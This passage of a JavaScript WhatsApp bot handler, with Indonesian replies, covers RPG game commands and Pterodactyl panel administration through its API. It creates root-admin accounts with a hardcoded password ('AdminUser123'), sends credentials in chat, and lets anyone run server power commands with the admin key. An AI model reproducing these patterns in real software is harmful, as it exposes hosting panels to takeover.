*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					case 'ikan': {
						if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 200)
						if (`${usersdb[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
						usersdb[m.sender].saldo -= uang
						rpgdb[m.sender].ikan += parseInt(args[1])
						m.sendForward(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Ikan: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${usersdb[m.sender].saldo}

`)
					}
					break
					default:
						let teks = `------- » *🛍️ MARKET 🛍️* « -------

*Pilih Barang Yang*
*Akan Di Beli*
- emas
- besi
- batubara
- perak
- kayu
- ayam
- sapi
- domba
- ikan

*Contoh:*
${prefix + command} ikan

`
						vreden.sendMessage(m.chat, {
							text: teks,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 9999,
								isForwarded: true,
								forwardedNewsletterMessageInfo: {
									newsletterJid: idsaluran,
									serverMessageId: null,
									newsletterName: `${namasaluran}`
								},
								externalAdReply: {
									title: "BUY AN ITEM",
									body: 'Buy the necessary items',
									thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
									sourceUrl: "-",
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						}, {
							quoted: m
						})
				}
			}
			break
			case 'bekerja':
			case 'kerja': {
				let type = (args[0] || '').toLowerCase()
				let time = rpgdb[m.sender].lastkerja + 600000
				let __timers = (new Date - rpgdb[m.sender].lastkerja)
				let _timers = (0 - __timers)
				let timers = clockString(_timers)
				let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
				let penumpang = await pickRandom(penumpan)
				let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
				let dagangan = await pickRandom(daganga)
				let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
				let pasien = await pickRandom(pasie)
				let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
				let panen = await pickRandom(pane)
				let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
				let bengkel = await pickRandom(bengke)
				let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
				let rumah = await pickRandom(ruma)

				switch (type) {
					case 'ojek':
						if (new Date - rpgdb[m.sender].lastkerja < 600000) return m.warning(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
						let hasilojek = Math.floor(Math.random() * 10000)
						m.reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} 💰*`).then(() => {
							usersdb[m.sender].saldo += hasilojek
							rpgdb[m.sender].lastkerja = new Date * 1
						})
						break
					case 'pedagang':
						if (new Date - rpgdb[m.sender].lastkerja < 600000) return m.warning(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasildagang = Math.floor(Math.random() * 10000)
						m.reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} 💰*`).then(() => {
							usersdb[m.sender].saldo += hasildagang
							rpgdb[m.sender].lastkerja = new Date * 1
						})
						break
					case 'dokter':
						if (new Date - rpgdb[m.sender].lastkerja < 600000) return m.warning(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasildokter = Math.floor(Math.random() * 10000)
						m.reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* 💰`).then(() => {
							usersdb[m.sender].saldo += hasildokter
							rpgdb[m.sender].lastkerja = new Date * 1
						})
						break
					case 'petani':
						if (new Date - rpgdb[m.sender].lastkerja < 600000) return m.warning(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasiltani = Math.floor(Math.random() * 10000)
						m.reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} 💰*`).then(() => {
							usersdb[m.sender].saldo += hasiltani
							rpgdb[m.sender].lastkerja = new Date * 1
						})
						break
					case 'montir':
						if (new Date - rpgdb[m.sender].lastkerja < 600000) return m.warning(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasilmontir = Math.floor(Math.random() * 10000)
						m.reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* 💰`).then(() => {
							usersdb[m.sender].saldo += hasilmontir
							rpgdb[m.sender].lastkerja = new Date * 1
						})
						break
					case 'kuli':
						if (new Date - rpgdb[m.sender].lastkerja < 600000) return m.warning(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasilkuli = Math.floor(Math.random() * 10000)
						m.reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} 💰*`).then(() => {
							usersdb[m.sender].saldo += hasilkuli
							rpgdb[m.sender].lastkerja = new Date * 1
						})
						break
					default:
						let teks = `
*💼 RPG - KERJA 💼*

*Select you job* :
- montir
- kuli
- petani
- dokter
- pedagang
- ojek

*Contoh* :
${prefix + command} kuli

`
						vreden.sendMessage(m.chat, {
							text: teks,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 9999,
								isForwarded: true,
								forwardedNewsletterMessageInfo: {
									newsletterJid: idsaluran,
									serverMessageId: null,
									newsletterName: `${namasaluran}`
								},
								externalAdReply: {
									title: "RPG - JOB SIMULATOR",
									body: 'Choose a job and enjoy the results',
									thumbnailUrl: "https://pomf2.lain.la/f/x1pvc1mq.jpg",
									sourceUrl: "tes",
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						}, {
							quoted: m
						})
				}
			}
			break
			case 'merampok':
			case 'rampok': {
				let hasil = (Math.floor(Math.random() * 50000))
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`*Tag/Reply Target!*\n\nContoh :\n${prefix + command} @0`)
				if (users == m.sender) return m.reply("Gak bisa ngerampok diri sendiri goblok 😑")
				let __timers = (new Date - rpgdb[m.sender].lastrampok)
				let _timers = (3600000 - __timers)
				let timers = clockString(_timers)
				if (new Date - rpgdb[m.sender].lastrampok > 3600000) {
					if (usersdb[users].saldo < 50000) return m.reply("Target kismin cokk🙀")
					usersdb[users].saldo -= hasil * 1
					usersdb[m.sender].saldo += hasil * 1
					rpgdb[m.sender].lastrampok = new Date * 1
					m.reply(`😈Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
				} else m.reply(`Loe udah ngerampok ngabb😑\ntunggu ${timers} untuk merampok lagi`)
			}
			break
			case 'redeem': {
				db.redeem = db.redeem || {
					isRedeem: false,
					code: "",
					user: [],
					maxRedeem: 0
				}
				if (!db.redeem.isRedeem) return m.reply("*Gak ada redeem yang di berikan 😓*")
				if (!text) return m.reply("*Masukin kodenya wak!*")
				if (db.redeem.isRedeem) {
					let code = text.toLowerCase()
					let redeem = db.redeem.code.toLowerCase()
					if (code !== redeem) return m.reply("*Kode kamu gak valid!*")
					if (db.redeem.maxRedeem < 1) return m.reply("*Kode udah abiss cokk*")
					if (db.redeem.user.includes(m.sender)) return m.reply("*Loee udah tadi ngabb!*")
					db.redeem.user.push(m.sender)
					db.redeem.maxRedeem -= 1
					usersdb[m.sender].saldo += 10000
					usersdb[m.sender].exp += 1000
					usersdb[m.sender].rank += 300
					usersdb[m.sender].limit += 200
					usersdb[m.sender].glimit += 200
					let teks = `*CONGRATULATION 🥳*


*Kamu mendapatkan* :
-  Rp 10k balance
-  1000 EXP
-  300 Rank Points 
-  200 Limit
-  200 Game Limit

`
					m.reply(teks)
					if (db.redeem.maxRedeem < 1) {
						await timeout(600000)
						delete db.redeem
					}
				} else {
					m.reply("*Gak ada redeem yang di berikan 😓*")
				}
			}
			break
			case 'redeemset':
			case 'setredeem': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				db.redeem = db.redeem || {
					isRedeem: false,
					code: "",
					user: [],
					maxRedeem: 0
				}
				if (!args[0]) return m.reply(`*Masukin Kode Redemnya!*\n\nContoh:\n${prefix + command} epep 10`)
				if (!args[1]) return m.reply(`*Masukin Jumlah Tersedia!*\n\nContoh:\n${prefix + command} epep 10`)
				if (isNaN(args[1])) return m.reply(`*Jumlah Harus Angka!*\n\nContoh:\n${prefix + command} epep 10`)
				db.redeem.isRedeem = true
				db.redeem.code = args[0]
				db.redeem.user = []
				db.redeem.maxRedeem = args[1]
				m.reply("*Code Redeem, Berhasil Di Setting*")
			}
			break
			case 'delredeem':
			case 'redeemdel': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				db.redeem = db.redeem || {
					isRedeem: false,
					code: "",
					user: [],
					maxRedeem: 0
				}
				if (db.redeem.isRedeem) {
					m.reply("*Redeem Code Dihapus!*")
					delete db.redeem
				} else {
					m.reply("*Gak ada sesi redeem icik boss*")
				}
			}
			break
			case 'inventory':
			case 'inv':
			case 'profile':
			case 'profil': {
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender
				if (!usersdb[users].rpg) return m.warning(`*User Belum Join RPG*\n\nketik _.joinrpg_`)
				let nonya = await PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international')
				let teks = `*⚔️ RPG - PROFILE ⚔️*

_*Crafting Item 🛠️*_
- Kapal: ${rpgdb[users].kapal ? `(${rpgdb[m.sender].darahkapal}% HP)` : 'Nothing'}
- Rumah: ${rpgdb[users].rumah} Unit
- Kapak: ${rpgdb[users].kapak ? `(${rpgdb[m.sender].darahkapak}% HP)` : 'Nothing'}
- Pickaxe: ${rpgdb[users].pickaxe ? `(${rpgdb[m.sender].darahpickaxe}% HP)` : 'Nothing'}
- Baju Zirah: ${rpgdb[users].bzirah ? `(${rpgdb[m.sender].darahbzirah}% HP)` : 'Nothing'}
- Pedang: ${rpgdb[users].pedang ? `(${rpgdb[m.sender].darahpedang}% HP)` : 'Nothing'}
- Kain: ${rpgdb[users].kain} Lembar

_*User About 🤺*_
- User Healthy: ${rpgdb[users].darahuser}/100
- Keberadaan: ${rpgdb[users].wilayah}

_*Sumber Daya 🧰*_
- Kayu: ${rpgdb[users].kayu} Batang
- Besi: ${rpgdb[users].besi} Biji
- Emas: ${rpgdb[users].emas} Biji
- Perak: ${rpgdb[users].perak} Biji
- Batubara: ${rpgdb[users].batubara} Biji

_*Hewan & Ternak🐄*_
- Ayam: ${rpgdb[users].ayam} Ekor
- Sapi: ${rpgdb[users].sapi} Ekor
- Domba: ${rpgdb[users].domba} Ekor
- Ikan: ${rpgdb[users].ikan} Ekor

> ID: ${nonya}
`
				await vreden.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						mentionedJid: [users],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: idsaluran,
							serverMessageId: null,
							newsletterName: `${namasaluran}`
						},
						externalAdReply: {
							title: "RPG-GAME (Inventory)",
							body: 'looking for supplies to survival',
							thumbnailUrl: "https://telegra.ph/file/675903e8c4a42e1dd990b.jpg",
							sourceUrl: "-",
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
			}
			break
			case 'mingguan': {
				try {
					if (isMingguan) {
						let cekming = ms(_mingguan.getMingguanExpired(m.sender) - Date.now())
						m.reply(`Kamu Sudah Mengambilnya Minggu Ini\nTunggu Selama ${cekming.days} Hari ${cekming.hours} Jam ${cekming.minutes} Menit Lagi`)
					}
					if (!isMingguan) {
						lim = 10
						let bal = 7000

						let wak = '7d'
						usersdb[m.sender].saldo += parseInt(bal)
						usersdb[m.sender].limit += parseInt(lim)
						m.reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${bal} \n- + ${lim} Limit\n\n`)
						_mingguan.addMingguanUser(m.sender, wak)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'bulanan': {
				try {
					if (isBulanan) {
						let cekming = ms(_bulanan.getBulananExpired(m.sender) - Date.now())
						m.reply(`Kamu Sudah Mengambilnya Bulan Ini\nTunggu Selama ${cekming.days} Hari ${cekming.hours} Jam ${cekming.minutes} Menit Lagi`)
					}
					if (!isBulanan) {
						lim = 10
						let bal = 7000

						let wak = '30d'
						usersdb[m.sender].saldo += parseInt(bal)
						usersdb[m.sender].limit += parseInt(lim)
						m.reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${bal} \n- + ${lim} Limit\n\n`)
						_bulanan.addBulananUser(m.sender, wak)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'addusradmin': {
				if (!isCreator) return m.reply(mess.OnlyOwner)
				let t = q.split(',');
				if (t.length < 3) return m.reply(`${prefix + command} email,username,name,number/tag`);
				let email = t[0];
				let username = t[1];
				let name = t[2];
				let passwordnya = 'AdminUser123'
				let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				try {
					if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": name,
							"last_name": "Admin",
							"root_admin": true,
							"language": "en",
							"password": passwordnya
						})
					})
					let data = await f.json();
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let user = data.attributes

					let p = await m.reply(`
*USER SUKSES DIBUAT*

id: ${user.id}
username: ${user.username}
email: ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`)
					let txt = `
email: ${email}
username: ${username}
password: ${passwordnya}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${passwordnya}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'listusr': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let page = args[0] ? args[0] : '1'
				try {
					let f = await fetch(panel + "/api/application/users?page=" + page, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let res = await f.json();
					let users = res.data
					let sections = "*DATA USER PANEL*"
					for (let user of users) {
						let u = user.attributes
						sections += `\n\n*${u.id}. ${u.username}*\n *User :* ${u.first_name} ${u.last_name}\n *Admin :* ${u.root_admin}\n *Bahasa :* ${u.language}`
					}
					vreden.sendMessage(m.chat, {
						text: sections.trim(),
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: botName,
								body: 'Pterodactly Panel',
								thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png",
								sourceUrl: gcwa,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: fchannel
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'listsrv': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let page = args[0] ? args[0] : '1'
				try {
					let f = await fetch(panel + "/api/application/servers?page=" + page, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let res = await f.json();
					let servers = res.data
					let sections = "*DATA SERVER PANEL*"
					for (let server of servers) {
						let s = server.attributes
						let f3 = await fetch(panel + "/api/client/servers/" + s.uuid.split`-` [0] + "/resources", {
							"method": "GET",
							"headers": {
								"Accept": "application/json",
								"Content-Type": "application/json",
								"Authorization": "Bearer " + cred
							}
						})
						let data = await f3.json();

						sections += `\n\n*${s.id}.* Server : ${s.name}`
					}
					vreden.sendMessage(m.chat, {
						text: sections.trim(),
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: botName,
								body: 'Pterodactly Panel',
								thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png",
								sourceUrl: gcwa,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: fchannel
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'addusr': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)

				let t = q.split(',');
				if (t.length < 3) return m.reply(`${prefix + command} email,username,name,number/tag`);
				let email = t[0];
				let username = t[1];
				let name = t[2];
				//let password
				let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				try {
					if (!u) return m.reply(`*PENGGUNAAN SALAH [!]*

Isi Data Anda Disini
${prefix + command} name@gmail.com,name,number\n\ncontoh : addusr vreden@gmail.com,vreden,${nomore}`);
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": name,
							"last_name": "Member",
							"root_admin": false,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
					let user = data.attributes

					let p = await vreden.sendMessage(m.chat, {
						text: `
*USER SUKSES DIBUAT*

id: ${user.id}
username: ${user.username}
email: ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`,
						mentions: [u],
					}, {
						quoted: m
					})
					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'addsrv': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let s = q.split(',');
				if (s.length < 7) return m.reply(`Format salah! silahkan isi data di bawah\nname,desc,userId,egg,locId,memory/disk,cpu`)
				let name = s[0];
				let desc = s[1] || ''
				let usr_id = s[2];
				let egg = s[3];
				let loc = s[4];
				let memo_disk = s[5].split`/`;
				let cpu = s[6];
				try {

					let f1 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data = await f1.json();
					//console.log(data.attributes.startup)
					let startup_cmd = data.attributes.startup

					let f = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": desc,
							"user": usr_id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo_disk[0],
								"swap": 0,
								"disk": memo_disk[1],
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f.json()
					if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					m.reply(`*SUCCESS CREATE SERVER*

*ID : ${server.id}*
UUID : ${server.uuid}
NAME : ${server.name}
DESC : ${server.description}
DISK : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
CPU : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
DATE : ${server.created_at}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'delsrv': {
				if (!isCreator) return reply('cannot access')
				let srv = args[0]
				if (!srv) return m.reply('Input *ID* Server')
				try {
					let f = await fetch(panel + "/api/application/servers/" + srv, {
						"method": "DELETE",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						}
					})
					let res = f.ok ? {
						errors: null
					} : await f.json()
					if (res.errors) return m.reply('*NOT FOUND [!]*')
					reply('*SERVER DI HAPUS [!]*')
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'delusr': {
				if (!isCreator) return reply('this for creator')
				let usr = args[0]
				if (!usr) return m.reply('Input User *ID*')
				try {
					let f = await fetch(panel + "/api/application/users/" + usr, {
						"method": "DELETE",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					//let res = await f.json()
					let res = f.ok ? {
						errors: null
					} : await f.json()
					if (res.errors) return m.reply('*NOT FOUND*')
					reply(`*${usr} DELETED*`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'startsrv':
			case 'stopsrv':
			case 'restartsrv': {
				let action = command.replace('srv', '')
				let srv = args[0]
				if (!srv) return m.reply('input *ID* from server')
				try {
					let f = await fetch(panel + "/api/client/servers/" + srv + "/power", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"signal": action
						})
					})

					let res = f.ok ? {
						errors: null
					} : await f.json()
					if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
					reply(`Sukses ${action.toUpperCase()} Server`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '1gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 1gb"
				let egg = eggsnya
				let loc = location
				let memo = "1200"
				let cpu = "30"
				let disk = "1200"
				let email = username + "1gb@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '2gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 2gb"
				let egg = eggsnya
				let loc = location
				let memo = "2200"
				let cpu = "40"
				let disk = "2200"
				let email = username + "2gb@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
